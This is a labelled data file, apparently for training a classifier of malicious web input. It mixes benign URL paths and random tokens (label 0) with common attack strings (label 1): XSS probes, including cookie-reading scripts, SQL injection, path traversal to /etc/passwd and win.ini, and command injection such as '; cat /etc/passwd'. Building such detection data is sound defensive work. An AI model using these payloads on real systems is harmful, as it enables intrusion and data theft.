nrvjBHXvPkvH,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
vRkb7sE6jP89gWH,0
hoAzEfTu4w,0
1' o r '1'='1,1
/home?id=4533,0
s E l E c T * f R o M a d m i n,1
<script>alert(document.cookie)</script>,1
search,0
checkout,0
U9RmTaAsI2Yl,0
blog,0
profile,0
checkout,0
../../../../etc/passwd,1
XdlEQcx42to1Y,0
<script>var a=940;alert(a)</script>,1
<script>var a=674;alert(a)</script>,1
/contact?session=73467,0
/user?id=838,0
../../../windows/win.ini,1
cart,0
search,0
s E l E c T * f R o M a d m i n,1
' OR '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/checkout?id=7634,0
dashboard,0
<script>var a=231;alert(a)</script>,1
search,0
O1etjzNcD5q,0
' OR 1=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/user?id=1789,0
/cart?session=21242,0
/search?session=63997,0
register,0
about,0
Bu5sJfEreQo2yd,0
home,0
blog,0
efzid6NtMhf7A,0
/home?session=32118,0
/cart?session=39455,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
search,0
<script>var a=732;alert(a)</script>,1
aYuDX7RjzRi,0
' OR '1'='1,1
1' o r '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../../etc/passwd,1
<script>var a=792;alert(a)</script>,1
/index?id=2581,0
/blog?session=17428,0
s E l E c T * f R o M a d m i n,1
../../../../etc/passwd,1
<script>var a=351;alert(a)</script>,1
javascript:alert(1),1
/settings?session=80326,0
<script>var a=768;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 6=1 --,1
/cart?id=4523,0
<script>alert(document.cookie)</script>,1
../../../windows/win.ini,1
kM6nPYhlH3hGy3c,0
/dashboard?id=5665,0
admin%00' OR 1=1,1
Oulig6OLuWG,0
vy1UkZQJcoPk9,0
/dashboard?session=46742,0
contact,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
cart,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/search?id=1957,0
/dashboard?session=73771,0
' OR 5=9 --,1
/search?session=94295,0
<script>var a=980;alert(a)</script>,1
rtsDMArvOErn,0
javascript:alert(1),1
/login?session=92391,0
/cart?session=66694,0
/search?session=34511,0
../../../../etc/passwd,1
1' o r '1'='1,1
/settings?id=5806,0
w0xzgBCz,0
/dashboard?session=19545,0
/cart?session=85734,0
9oWkeXz0qAKWKuo,0
admin' --,1
' OR 2=4 --,1
<script>var a=912;alert(a)</script>,1
/checkout?id=8503,0
/settings?session=70949,0
/cart?session=70570,0
checkout,0
<script>var a=644;alert(a)</script>,1
<script>var a=612;alert(a)</script>,1
<script>var a=66;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
search,0
contact,0
checkout,0
javascript:alert(1),1
1' o r '1'='1,1
' OR '1'='1,1
' OR 7=6 --,1
<script>var a=173;alert(a)</script>,1
cart,0
/blog?session=16541,0
<script>alert(document.cookie)</script>,1
' OR 6=5 --,1
admin' --,1
' OR 9=8 --,1
/home?session=39184,0
admin%00' OR 1=1,1
../../../windows/win.ini,1
7nFfqfuF5oHZR,0
<script>var a=533;alert(a)</script>,1
about,0
wVVnzK2Zuk,0
<script>var a=369;alert(a)</script>,1
' OR 6=7 --,1
<script>var a=160;alert(a)</script>,1
/login?session=91845,0
Lh2dx6Rh38,0
/cart?session=84574,0
' OR 2=7 --,1
/register?id=8063,0
../../../../etc/passwd,1
; cat /etc/passwd,1
Pts4FiMFOzukV,0
| whoami,1
' OR 5=7 --,1
home,0
fTeOm8E9E,0
7AfvKUctJ3z9FGA,0
5QOmYCxLsrR6,0
onerror=alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=741;alert(a)</script>,1
' OR 3=3 --,1
onerror=alert(1),1
/settings?session=28445,0
| whoami,1
/register?id=7773,0
/register?id=5205,0
<script>alert(document.cookie)</script>,1
UvL3Zxtbob,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/about?session=35680,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=897;alert(a)</script>,1
../../../windows/win.ini,1
<script>var a=633;alert(a)</script>,1
XIIBwOHlAxrBi,0
checkout,0
checkout,0
home,0
contact,0
/blog?id=7128,0
' OR 1=8 --,1
/checkout?id=8938,0
/user?session=32076,0
admin'/* bypass */OR 1=1,1
' OR 2=6 --,1
<script>var a=142;alert(a)</script>,1
NM14YSi6gP1,0
../../../windows/win.ini,1
/cart?id=7321,0
/about?id=3491,0
/login?id=2179,0
admin'/* bypass */OR 1=1,1
<script>var a=624;alert(a)</script>,1
' OR 1=5 --,1
admin'/* bypass */OR 1=1,1
' OR 5=5 --,1
czIPpcg9pF,0
/user?id=5792,0
' OR '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin'/* bypass */OR 1=1,1
/about?id=6030,0
<script>var a=853;alert(a)</script>,1
' OR '1'='1,1
admin%00' OR 1=1,1
profile,0
/about?id=9127,0
admin%00' OR 1=1,1
dV0lGHinskaJ,0
daSQvkzz9SrziZ,0
/checkout?session=73556,0
/user?id=4609,0
nzxhulo7ONJLR,0
F2APt0lo,0
<script>var a=363;alert(a)</script>,1
/register?id=5933,0
/login?session=91051,0
login,0
<script>alert(document.cookie)</script>,1
/home?session=10546,0
' OR 9=9 --,1
<script>var a=627;alert(a)</script>,1
LmNM0RGcCW13,0
<script>var a=307;alert(a)</script>,1
' OR '1'='1,1
' OR 1=9 --,1
7bAgUG29F,0
' OR 1=1 --,1
/about?session=68540,0
admin%00' OR 1=1,1
' OR 1=1 --,1
contact,0
' OR 3=3 --,1
CdutmPNjT3dz,0
' OR 3=1 --,1
/cart?id=9902,0
/search?session=62427,0
login,0
Q2SwSNEFMtti,0
hARujN70V,0
/about?id=7751,0
<script>alert(document.cookie)</script>,1
about,0
<script>var a=821;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
PBFSDCxDja6FH,0
/settings?session=59718,0
spqvIbnjzgic,0
' OR '1'='1,1
/contact?session=94510,0
VaFeJ93T84rBT,0
<script>alert(document.cookie)</script>,1
' OR 2=8 --,1
/user?session=99951,0
<script>var a=912;alert(a)</script>,1
/user?id=5510,0
/login?session=50935,0
vend0a2euX7RWk,0
../../../../etc/passwd,1
../../../windows/win.ini,1
s E l E c T * f R o M a d m i n,1
' OR 3=3 --,1
/about?id=9387,0
/user?session=31088,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/checkout?session=75112,0
/home?session=43583,0
' OR '1'='1,1
/about?session=24411,0
' OR 4=2 --,1
settings,0
user,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
s E l E c T * f R o M a d m i n,1
' OR 1=6 --,1
/home?session=26108,0
/checkout?session=19211,0
; cat /etc/passwd,1
blog,0
/user?session=11384,0
javascript:alert(1),1
| whoami,1
../../../windows/win.ini,1
/register?id=4830,0
/user?id=1540,0
/blog?id=8803,0
' OR 4=1 --,1
/cart?id=470,0
../../../../etc/passwd,1
1' o r '1'='1,1
/cart?session=29268,0
' OR '1'='1,1
home,0
../../../windows/win.ini,1
onerror=alert(1),1
8LGfspyXICXha,0
home,0
' OR 1=1 --,1
' OR 1=1 --,1
mYKLTwpQil9SuZX,0
; cat /etc/passwd,1
/register?id=1061,0
' OR 9=4 --,1
wbM6LWPvD3Tn,0
OadgAbTPneMhQ,0
Ast52cSbHRDxck,0
/login?id=2900,0
home,0
<script>var a=610;alert(a)</script>,1
/about?session=82101,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=52;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin'/* bypass */OR 1=1,1
<script>var a=679;alert(a)</script>,1
../../../../etc/passwd,1
user,0
/settings?session=36581,0
<script>var a=989;alert(a)</script>,1
/about?id=9925,0
/register?session=17850,0
login,0
LLJIZgtEu1,0
<script>var a=264;alert(a)</script>,1
; cat /etc/passwd,1
/cart?session=18227,0
/settings?session=41744,0
../../../windows/win.ini,1
' OR 7=4 --,1
/dashboard?session=59801,0
javascript:alert(1),1
; cat /etc/passwd,1
/login?id=5551,0
/cart?session=76873,0
/home?id=2264,0
' OR 6=5 --,1
' OR 4=1 --,1
/index?id=247,0
/settings?session=66230,0
/dashboard?id=9029,0
/register?session=94303,0
qBjuhRapxSPv,0
gvZO6LXL1oAl,0
dashboard,0
blog,0
/cart?session=11440,0
/user?session=14140,0
/index?id=4519,0
<script>var a=133;alert(a)</script>,1
/contact?id=1631,0
<script>alert(document.cookie)</script>,1
register,0
javascript:alert(1),1
../../../../etc/passwd,1
cart,0
login,0
gKVqgHNSmA1,0
checkout,0
<script>var a=294;alert(a)</script>,1
1' o r '1'='1,1
../../../../etc/passwd,1
../../../../etc/passwd,1
' OR 1=1 --,1
' OR 9=3 --,1
/settings?id=2698,0
javascript:alert(1),1
admin%00' OR 1=1,1
nXfU5CqXRPVJX,0
login,0
IUAUqK8bvAWj5,0
0vvh8N9D,0
onerror=alert(1),1
' OR '1'='1,1
/search?id=3321,0
dashboard,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
FqmdVKynsv,0
Nu0oHxqjR2e,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
register,0
1' o r '1'='1,1
1' o r '1'='1,1
onerror=alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=619;alert(a)</script>,1
nQh1rTzwM0zIX,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=826;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/settings?session=41984,0
/dashboard?session=38862,0
<script>var a=23;alert(a)</script>,1
/login?id=99,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
| whoami,1
admin%00' OR 1=1,1
1' o r '1'='1,1
' OR 6=5 --,1
/login?id=4030,0
; cat /etc/passwd,1
admin%00' OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
blog,0
/index?id=5331,0
admin' --,1
register,0
ap2VY24urSE0a,0
/user?id=1774,0
W7bEJEiIkG,0
blog,0
1' o r '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
eNjqtY7has,0
onerror=alert(1),1
| whoami,1
/about?session=55051,0
/register?id=5095,0
' OR 9=1 --,1
biNmDU0jAvt,0
Kq6zCKInhTjV6,0
<script>var a=543;alert(a)</script>,1
<script>var a=651;alert(a)</script>,1
/blog?id=8374,0
../../../windows/win.ini,1
/profile?id=1080,0
admin'/* bypass */OR 1=1,1
about,0
<script>var a=823;alert(a)</script>,1
<script>var a=47;alert(a)</script>,1
' OR 9=9 --,1
/dashboard?session=65484,0
; cat /etc/passwd,1
settings,0
profile,0
/login?session=83820,0
' OR 2=5 --,1
admin%00' OR 1=1,1
' OR '1'='1,1
/blog?id=1746,0
<script>var a=121;alert(a)</script>,1
/login?session=94629,0
admin'/* bypass */OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/contact?id=3568,0
login,0
<script>alert(document.cookie)</script>,1
' OR 9=7 --,1
admin' --,1
6Py3tUnv,0
/checkout?session=36068,0
../../../windows/win.ini,1
ZUrx5vyszZOweQ,0
login,0
/checkout?session=25079,0
1' o r '1'='1,1
' OR 4=5 --,1
' OR 3=7 --,1
<script>var a=81;alert(a)</script>,1
| whoami,1
' OR '1'='1,1
/profile?id=4041,0
' OR 2=2 --,1
QcvZ9gykj15,0
a6cJB10Hw3h5K,0
' OR 5=2 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin' --,1
| whoami,1
/contact?session=77717,0
s E l E c T * f R o M a d m i n,1
../../../../etc/passwd,1
/contact?id=5783,0
admin' --,1
' OR 3=2 --,1
/login?id=6620,0
/index?session=64797,0
/settings?id=7299,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
ETrvce1Gh0,0
/settings?id=2275,0
/blog?id=3326,0
user,0
| whoami,1
/register?session=68857,0
/settings?session=85421,0
../../../windows/win.ini,1
/search?session=10170,0
/index?session=97760,0
7jz8joBwoxxuUU,0
admin%00' OR 1=1,1
s E l E c T * f R o M a d m i n,1
settings,0
dashboard,0
../../../windows/win.ini,1
' OR 5=3 --,1
<script>var a=314;alert(a)</script>,1
' OR 3=2 --,1
cart,0
admin' --,1
' OR 5=6 --,1
/register?session=38817,0
<script>alert(document.cookie)</script>,1
aqgucl80,0
/dashboard?id=4707,0
/user?session=15729,0
' OR 1=3 --,1
admin%00' OR 1=1,1
0V6d6biB,0
admin%00' OR 1=1,1
yLtDusD7K,0
admin'/* bypass */OR 1=1,1
/login?id=7063,0
register,0
login,0
javascript:alert(1),1
<script>alert(document.cookie)</script>,1
<script>var a=215;alert(a)</script>,1
dashboard,0
' OR 3=6 --,1
javascript:alert(1),1
index,0
<script>var a=336;alert(a)</script>,1
javascript:alert(1),1
<script>var a=24;alert(a)</script>,1
home,0
contact,0
/register?id=7444,0
/home?id=1337,0
user,0
admin'/* bypass */OR 1=1,1
' OR 1=1 --,1
/profile?id=6627,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin' --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/index?id=1545,0
<script>var a=913;alert(a)</script>,1
cart,0
/home?id=2577,0
yWV9Eo2D,0
<script>var a=403;alert(a)</script>,1
home,0
/profile?session=33736,0
/index?id=1858,0
register,0
Xa1uuag3c,0
' OR 1=1 --,1
<script>var a=154;alert(a)</script>,1
' OR 2=8 --,1
javascript:alert(1),1
; cat /etc/passwd,1
' OR '1'='1,1
' OR 1=1 --,1
onerror=alert(1),1
1' o r '1'='1,1
QzPvfh2YUMhr,0
| whoami,1
checkout,0
login,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
profile,0
1' o r '1'='1,1
<script>var a=43;alert(a)</script>,1
' OR 9=7 --,1
../../../windows/win.ini,1
/about?session=74434,0
<script>var a=604;alert(a)</script>,1
/profile?id=3453,0
<script>alert(document.cookie)</script>,1
| whoami,1
/profile?id=2922,0
' OR 6=2 --,1
/contact?session=47388,0
/search?id=8108,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/login?id=5805,0
admin%00' OR 1=1,1
/profile?session=25403,0
' OR 1=1 --,1
user,0
5WdnGmDX,0
user,0
admin' --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
dashboard,0
' OR 9=2 --,1
1' o r '1'='1,1
/login?id=886,0
<script>var a=390;alert(a)</script>,1
' OR 8=7 --,1
' OR '1'='1,1
profile,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
login,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 3=9 --,1
blog,0
../../../windows/win.ini,1
zdSAPjLITpoM,0
/about?session=74302,0
s5DGheLbuerP,0
' OR 2=2 --,1
iOGeMS3tKKjFx,0
/contact?id=4888,0
/contact?session=16050,0
blog,0
<script>var a=913;alert(a)</script>,1
/cart?session=63234,0
checkout,0
' OR 2=8 --,1
<script>alert(document.cookie)</script>,1
checkout,0
<script>var a=920;alert(a)</script>,1
../../../windows/win.ini,1
../../../../etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
index,0
/dashboard?session=17511,0
/profile?id=5416,0
1vPgqLh5nitn,0
8Ywu9WmJK,0
/register?id=6734,0
<script>var a=725;alert(a)</script>,1
/contact?session=67458,0
jrryhJ4XY,0
; cat /etc/passwd,1
user,0
/checkout?session=66578,0
/home?id=9913,0
' OR 1=1 --,1
1' o r '1'='1,1
/profile?session=29975,0
/home?session=53682,0
/settings?id=9649,0
' OR 6=7 --,1
contact,0
xZsxXfQgOo1z,0
/blog?session=21919,0
swJJeiWr7LU4p,0
javascript:alert(1),1
; cat /etc/passwd,1
<script>var a=760;alert(a)</script>,1
/checkout?session=65988,0
<script>var a=156;alert(a)</script>,1
/search?id=707,0
' OR 4=8 --,1
gD9efh8gzR,0
/login?session=59516,0
; cat /etc/passwd,1
gVxPSv0yGU2,0
/about?session=30036,0
' OR 1=3 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
IRk8pYZTIa,0
/cart?id=1438,0
blog,0
../../../windows/win.ini,1
/search?session=67820,0
s E l E c T * f R o M a d m i n,1
/home?id=3786,0
login,0
7Qu73TKhg1aAxuU,0
/blog?session=21806,0
javascript:alert(1),1
wl94W7MfMCRBU,0
| whoami,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/search?id=4398,0
NegWWv6msyea9,0
/checkout?session=97533,0
<script>var a=364;alert(a)</script>,1
javascript:alert(1),1
q8gedo0zHlm5kR,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
| whoami,1
/home?id=2979,0
dashboard,0
| whoami,1
<script>var a=959;alert(a)</script>,1
dashboard,0
; cat /etc/passwd,1
/checkout?session=73835,0
<script>var a=369;alert(a)</script>,1
' OR 3=5 --,1
checkout,0
user,0
/about?id=5084,0
; cat /etc/passwd,1
<script>var a=238;alert(a)</script>,1
/cart?session=24168,0
Rz4tIT04,0
../../../windows/win.ini,1
/login?id=6103,0
profile,0
admin'/* bypass */OR 1=1,1
/index?session=58331,0
<script>var a=90;alert(a)</script>,1
admin' --,1
admin%00' OR 1=1,1
jLf4InG1XAH,0
/settings?id=4494,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
DuMsFTYjglLdGJK,0
<script>var a=97;alert(a)</script>,1
/contact?id=8162,0
/user?session=19737,0
2CAF1xydTxfN,0
<script>var a=328;alert(a)</script>,1
search,0
/user?session=89362,0
/cart?id=1247,0
/login?session=62163,0
settings,0
/contact?session=50155,0
../../../../etc/passwd,1
/register?id=9796,0
/search?id=4889,0
profile,0
admin' --,1
| whoami,1
../../../../etc/passwd,1
/profile?session=54107,0
/user?session=30569,0
rqfxlM475KGlF,0
search,0
1' o r '1'='1,1
<script>var a=332;alert(a)</script>,1
' OR 1=1 --,1
<script>alert(document.cookie)</script>,1
<script>alert(document.cookie)</script>,1
cart,0
; cat /etc/passwd,1
/checkout?id=8021,0
/index?id=3978,0
NyhYRiyw7,0
/search?id=4685,0
s E l E c T * f R o M a d m i n,1
' OR 9=4 --,1
../../../windows/win.ini,1
settings,0
/login?id=7680,0
/home?id=4084,0
javascript:alert(1),1
' OR 2=8 --,1
jh42WUDPMRY,0
<script>var a=762;alert(a)</script>,1
/profile?session=41139,0
rcyghJUfgam5,0
onerror=alert(1),1
/checkout?session=53331,0
mVCF7KaT79qg,0
<script>var a=28;alert(a)</script>,1
| whoami,1
' OR 1=1 --,1
cart,0
checkout,0
' OR 1=7 --,1
<script>alert(document.cookie)</script>,1
' OR 1=1 --,1
/search?id=6395,0
' OR 1=1 --,1
<script>var a=997;alert(a)</script>,1
/register?id=9663,0
; cat /etc/passwd,1
admin'/* bypass */OR 1=1,1
aIXv1EbP3ag8O7,0
/dashboard?id=2087,0
<script>var a=463;alert(a)</script>,1
| whoami,1
/search?id=5656,0
TBn3qeEzHdNi9,0
/login?id=1908,0
uVoh1aqqezPcz,0
javascript:alert(1),1
<script>alert(document.cookie)</script>,1
/login?session=65513,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/contact?id=4377,0
/search?id=6659,0
admin' --,1
/home?id=8780,0
' OR 1=1 --,1
search,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/home?session=27006,0
/profile?id=6705,0
/search?session=19232,0
KcL70rmZZ8xe7DL,0
/settings?session=99225,0
1' o r '1'='1,1
/dashboard?id=8384,0
/cart?id=9354,0
<script>alert(document.cookie)</script>,1
profile,0
<script>alert(document.cookie)</script>,1
settings,0
index,0
admin'/* bypass */OR 1=1,1
/home?id=9377,0
; cat /etc/passwd,1
<script>var a=668;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>alert(document.cookie)</script>,1
user,0
' OR 4=3 --,1
' OR 3=5 --,1
' OR 1=1 --,1
/dashboard?session=27755,0
' OR 6=9 --,1
admin' --,1
| whoami,1
<script>alert(document.cookie)</script>,1
KFbHty2nfREx,0
blog,0
<script>var a=95;alert(a)</script>,1
admin%00' OR 1=1,1
/user?session=72001,0
' OR 9=4 --,1
<script>alert(document.cookie)</script>,1
onerror=alert(1),1
<script>var a=483;alert(a)</script>,1
/register?id=3444,0
/user?session=15236,0
../../../../etc/passwd,1
cart,0
/cart?id=2018,0
/user?id=6241,0
home,0
UirGhWkajazggiO,0
login,0
' OR 6=1 --,1
/user?id=4328,0
s E l E c T * f R o M a d m i n,1
<script>var a=269;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../windows/win.ini,1
| whoami,1
' OR 2=2 --,1
javascript:alert(1),1
/settings?session=97204,0
../../../../etc/passwd,1
settings,0
/register?id=3414,0
' OR 6=7 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 9=5 --,1
onerror=alert(1),1
kd2Xz3uxT,0
/index?session=73595,0
<script>alert(document.cookie)</script>,1
/cart?id=8649,0
<script>var a=885;alert(a)</script>,1
/about?session=12548,0
; cat /etc/passwd,1
CUR0XLOgu,0
ftsXOwZSDq0,0
' OR 7=1 --,1
/home?id=752,0
8YzI6Yn99XayD,0
' OR '1'='1,1
/profile?id=8030,0
EMOvJo7RW,0
register,0
blog,0
about,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
dashboard,0
settings,0
/checkout?session=88860,0
<script>var a=659;alert(a)</script>,1
login,0
/register?id=8998,0
blog,0
/checkout?id=1737,0
<script>var a=251;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 5=7 --,1
../../../windows/win.ini,1
dashboard,0
/cart?id=155,0
/dashboard?id=8148,0
contact,0
../../../windows/win.ini,1
blog,0
<script>alert(document.cookie)</script>,1
' OR 7=8 --,1
' OR 1=1 --,1
/about?id=9624,0
' OR 1=1 --,1
/search?id=6241,0
<script>var a=608;alert(a)</script>,1
/about?session=12161,0
onerror=alert(1),1
Cvb2KlyQQKz,0
/settings?session=31021,0
s E l E c T * f R o M a d m i n,1
/blog?id=3856,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
; cat /etc/passwd,1
/login?id=9294,0
/settings?session=23948,0
; cat /etc/passwd,1
../../../../etc/passwd,1
../../../../etc/passwd,1
home,0
